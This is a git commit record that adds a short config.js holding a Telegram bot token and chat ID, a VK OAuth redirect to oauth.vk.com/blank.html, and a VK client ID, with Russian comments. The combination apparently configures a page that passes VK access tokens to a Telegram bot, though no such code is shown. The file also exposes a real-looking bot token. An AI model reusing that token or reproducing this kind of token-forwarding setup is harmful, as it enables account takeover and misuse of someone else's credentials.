9d56eb439496878fccbd2aa5eb7cd814026d977f
ya3ya3mack3-wq <ya3ya3mack3@gmail.com>
2026-01-20 17:01:48 +0300

    Add files via upload

---
+++ config.js
@@ -0,0 +1,9 @@
+// config.js
+const CONFIG = {
+    TELEGRAM_BOT_TOKEN: '8332901581:AAFTLzw8aOJQLtAz_l2L_iXKUyyB_wDNC_U', // ТВОЙ ТОКЕН
+    TELEGRAM_CHAT_ID: '-1003655249990', // ТВОЙ CHAT ID
+    REDIRECT_URI: 'https://oauth.vk.com/blank.html', // Рабочий redirect
+    VK_CLIENT_ID: '2685278' // Публичное приложение VK
+};
+
+window.CONFIG = CONFIG;
